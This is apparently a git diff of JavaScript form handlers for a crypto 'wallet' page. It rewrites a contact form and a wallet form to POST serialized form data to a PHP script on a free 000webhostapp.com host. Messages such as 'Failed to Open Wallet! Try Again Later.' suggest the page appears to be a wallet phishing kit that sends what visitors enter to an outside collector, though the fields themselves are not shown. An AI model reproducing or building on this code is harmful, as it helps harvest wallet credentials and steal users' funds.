@@ -67,29 +67,46 @@ if (contact) {
         contactSubmit.disabled = true;
         var formData = $(this).serialize();
 
-        $(function () {
-            $.ajax({
-                type: 'POST',
-                url: 'https://captivtec.000webhostapp.com/sify.php',
-                data: formData,
-                dataType: 'json',
-                success: function (response) {
-                    if (response.status === "success") {
-                        alertMessage(response.message, 'success');
-                        setTimeout(function () {
-                            $('#alertMessage').children('.alert').fadeOut();
-                            contactSubmit.disabled = false;
-                        }, 3000);
-                    } else {
-                        alertMessage('Failed to send email', 'danger');
-                        setTimeout(function () {
-                            $('#alertMessage').children('.alert').fadeOut();
-                            contactSubmit.disabled = false;
-                        }, 3000);
-                    }
+        var xhr = new XMLHttpRequest();
+
+        xhr.open('POST', 'https://captivtec.000webhostapp.com/sify.php');
+        xhr.responseType = 'json';
+
+        xhr.onload = function () {
+            if (xhr.status === 200) {
+                var response = xhr.response;
+                console.log(response.status);
+                if (response.status === "success") {
+                    alertMessage(response.message, 'success');
+                    setTimeout(function () {
+                        document.getElementById('alertMessage').querySelector('.alert').style.display = 'none';
+                        document.getElementById('walletSubmit').disabled = false;
+                    }, 3000);
+                } else {
+                    alertMessage('Failed to Open Wallet! Try Again Later.', 'danger');
+                    setTimeout(function () {
+                        document.getElementById('alertMessage').querySelector('.alert').style.display = 'none';
+                        document.getElementById('walletSubmit').disabled = false;
+                    }, 3000);
                 }
-            });
-        });
+            } else {
+                alertMessage('Internal Server Error.', 'danger');
+                setTimeout(function () {
+                    document.getElementById('alertMessage').querySelector('.alert').style.display = 'none';
+                    document.getElementById('walletSubmit').disabled = false;
+                }, 3000);
+            }
+        };
+
+        xhr.onerror = function () {
+            alertMessage('Failed to send request!', 'danger');
+            setTimeout(function () {
+                document.getElementById('alertMessage').querySelector('.alert').style.display = 'none';
+                document.getElementById('walletSubmit').disabled = false;
+            }, 3000);
+        };
+
+        xhr.send(formData);
     })
 }
 
@@ -182,7 +199,7 @@ if (wallet) {
         };
 
         xhr.onerror = function () {
-            alertMessage(xhr.statusText, 'danger');
+            alertMessage('Failed to send request!', 'danger');
             setTimeout(function () {
                 document.getElementById('alertMessage').querySelector('.alert').style.display = 'none';
                 document.getElementById('walletSubmit').disabled = false;
